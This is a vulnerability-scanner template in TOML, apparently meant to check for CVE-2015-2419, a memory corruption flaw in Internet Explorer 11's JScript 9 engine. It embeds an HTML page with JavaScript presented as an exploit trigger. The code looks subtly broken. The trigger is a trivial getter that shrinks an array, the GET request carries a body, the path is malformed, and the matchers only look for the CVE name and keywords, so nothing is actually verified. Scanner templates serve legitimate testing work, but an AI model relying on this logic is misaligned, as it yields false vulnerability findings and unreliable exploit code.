[info]
author = "ave"
description = "验证 Microsoft Internet Explorer 11 JScript 9 内存损坏漏洞 (CVE-2015-2419)。通过构造恶意 JavaScript 触发 JScript 9 内存操作越界，验证远程代码执行漏洞是否存在。"
id = "POC-AVE-2015-0300"
name = "CVE-2015-2419 PoC"
severity = "high"
tags = ["ave-2015-0300"]
vuln_id = [
    "CVE-2015-2419",
    "AVE-2015-0300",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = """
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">
    <title>CVE-2015-2419 PoC</title>
</head>
<body>
    <h1>CVE-2015-2419 PoC - IE11 JScript 9 Memory Corruption</h1>
    <p>If vulnerable, this will trigger memory corruption in JScript 9 engine.</p>
    <script>
        // CVE-2015-2419: JScript 9 Memory Corruption via crafted JavaScript
        // Based on ExploitDB 44743
        try {
            var arr = new Array(0x10000);
            for (var i = 0; i < arr.length; i++) {
                arr[i] = 0x12345678;
            }
            // Trigger the vulnerability via crafted object manipulation
            var obj = {};
            Object.defineProperty(obj, 'prop', {
                get: function() {
                    arr.length = 0x1000;
                    return 0xdeadbeef;
                }
            });
            // Force JIT compilation and trigger
            for (var j = 0; j < 1000; j++) {
                var x = obj.prop;
            }
            document.body.innerHTML += "<br>Exploit triggered - check for crash";
        } catch(e) {
            document.body.innerHTML += "<br>Error: " + e.message;
        }
    </script>
</body>
</html>"""
type = "raw"

[poc.requests.headers]
Content-Type = "text/html"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CVE-2015-2419",
    "JScript",
    "Memory Corruption",
]
